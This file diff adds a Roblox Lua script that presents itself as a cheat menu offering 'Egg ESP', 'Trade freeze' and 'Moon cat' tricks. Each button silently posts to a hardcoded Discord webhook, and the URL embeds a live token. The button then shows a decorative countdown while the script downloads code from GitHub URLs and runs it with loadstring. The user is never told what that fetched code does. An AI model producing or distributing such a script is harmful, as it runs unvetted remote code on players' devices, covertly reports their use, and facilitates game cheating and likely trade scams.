@@ -1,0 +1,198 @@
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local webhookUrl = "https://discord.com/api/webhooks/1403243175639781417/YkSGhWF9joF5GIpTvqTd0qE7pPqQbbXnU8-ULCAQ6hadivnOiu_S4R0jKY69dWdJ-c8V"
+
+-- Crear GUI principal
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DarkCountDownGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 350, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Text = "script made by delta-krnl"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.ZIndex = 2
+title.Parent = mainFrame
+
+-- Función para crear botones
+local function createButton(text, posY)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.8, 0, 0, 40)
+    btn.Position = UDim2.new(0.1, 0, 0, posY)
+    btn.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextScaled = true
+    btn.Text = text
+    btn.AutoButtonColor = false
+    btn.Parent = mainFrame
+
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    end)
+    btn.MouseLeave:Connect(function()
+        btn.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    end)
+
+    return btn
+end
+
+local btn1 = createButton("Egg ESP script-", 60)
+local btn2 = createButton("Trade freeze script-", 110)
+local btn3 = createButton("Moon cat method-", 160)
+
+-- Contador y mensajes
+local countdownFrame = Instance.new("Frame")
+countdownFrame.Size = UDim2.new(0, 300, 0, 130)
+countdownFrame.Position = UDim2.new(0.5, -150, 0.5, -65)
+countdownFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+countdownFrame.BorderSizePixel = 0
+countdownFrame.Visible = false
+countdownFrame.Active = true
+countdownFrame.Draggable = true
+countdownFrame.Parent = screenGui
+
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Size = UDim2.new(1, -20, 0, 30)
+warningLabel.Position = UDim2.new(0, 10, 0, 0)
+warningLabel.BackgroundTransparency = 1
+warningLabel.TextColor3 = Color3.new(1, 1, 1)
+warningLabel.Font = Enum.Font.Gotham
+warningLabel.TextSize = 12
+warningLabel.TextWrapped = true
+warningLabel.Text = ""
+warningLabel.Parent = countdownFrame
+
+local countdownLabel = Instance.new("TextLabel")
+countdownLabel.Size = UDim2.new(1, 0, 0.5, 0)
+countdownLabel.Position = UDim2.new(0, 0, 0, 35)
+countdownLabel.BackgroundTransparency = 1
+countdownLabel.TextColor3 = Color3.new(1, 1, 1)
+countdownLabel.Font = Enum.Font.GothamBold
+countdownLabel.TextSize = 12
+countdownLabel.Text = ""
+countdownLabel.Parent = countdownFrame
+
+local messageLabel = Instance.new("TextLabel")
+messageLabel.Size = UDim2.new(1, 0, 0.3, 0)
+messageLabel.Position = UDim2.new(0, 0, 0.75, 0)
+messageLabel.BackgroundTransparency = 1
+messageLabel.TextColor3 = Color3.new(1, 1, 1)
+messageLabel.Font = Enum.Font.Gotham
+messageLabel.TextSize = 12
+messageLabel.Text = ""
+messageLabel.Parent = countdownFrame
+
+-- Partículas
+local particlesRunning = false
+
+local function createFlameParticle(parent, side)
+	local particle = Instance.new("Frame")
+	particle.Size = UDim2.new(0, 8, 0, 12)
+	particle.AnchorPoint = Vector2.new(0.5, 1)
+	local posX = (side == "left") and 0 or 1
+	particle.Position = UDim2.new(posX, 0, 1, 0)
+
+	particle.BackgroundColor3 = (math.random() > 0.5) and Color3.fromRGB(170, 0, 255) or Color3.fromRGB(255, 50, 50)
+	particle.BackgroundTransparency = 0.3
+	particle.BorderSizePixel = 0
+	particle.ZIndex = 5
+	particle.Parent = parent
+
+	local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	local tween = TweenService:Create(particle, tweenInfo, {
+		Position = UDim2.new(posX, 0, 0, -30),
+		Size = UDim2.new(0, 4, 0, 6),
+		BackgroundTransparency = 1
+	})
+
+	tween:Play()
+	tween.Completed:Connect(function() particle:Destroy() end)
+end
+
+local function startFlameEffect()
+	particlesRunning = true
+	task.spawn(function()
+		while particlesRunning do
+			createFlameParticle(countdownFrame, "left")
+			createFlameParticle(countdownFrame, "right")
+			task.wait(0.15)
+		end
+	end)
+end
+
+local function stopFlameEffect()
+	particlesRunning = false
+end
+
+-- Webhook
+function sendWebhook(message)
+	local payload = HttpService:JSONEncode({ content = message })
+	local success, err = pcall(function()
+		HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+	end)
+	if not success then warn("Webhook error:", err) end
+end
+
+-- Mostrar cuenta regresiva solo visual, sin bloquear ejecución
+local countdownActive = false
+local function showCountdown(message, warningText)
+	if countdownActive then return end
+	countdownActive = true
+
+	mainFrame.Visible = false
+	countdownFrame.Visible = true
+	messageLabel.Text = message
+	warningLabel.Text = warningText
+
+	startFlameEffect()
+
+	-- No bloquear con wait, solo actualizar texto con delay sin detener ejecución
+	spawn(function()
+		for i = 20, 0, -1 do
+			countdownLabel.Text = tostring(i) .. "s"
+			task.wait(1)
+		end
+		stopFlameEffect()
+		countdownFrame.Visible = false
+		mainFrame.Visible = true
+		countdownActive = false
+	end)
+end
+
+-- Función para ejecutar script loadstring y mostrar efectos
+local function onButtonPressed(webhookMessage, countdownMsg, warningMsg, scriptUrl)
+	sendWebhook(webhookMessage)
+	showCountdown(countdownMsg, warningMsg)
+	
+	if scriptUrl then
+		local success, err = pcall(function()
+			loadstring(game:HttpGet(scriptUrl, true))()
+		end)
+		if not success then
+			warn("Error ejecutando script: ".. tostring(err))
+		end
+	end
+end
+
+-- Configuración de botones
+local buttons = {
+	{button = btn1, webhookMessage = "📦 Ejecutado: Egg ESP", countdownMsg = "Randomizing egg in 20 seconds", warning = "⚠️ Use again if egg fails ⚠️", script = "https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp"},
+	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️", script = ""},
+	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Use again if script fails ⚠️", script = "https://raw.githubusercontent.com/catmethod/tradefreezer/refs/heads/main/mooncat"}
+}
+
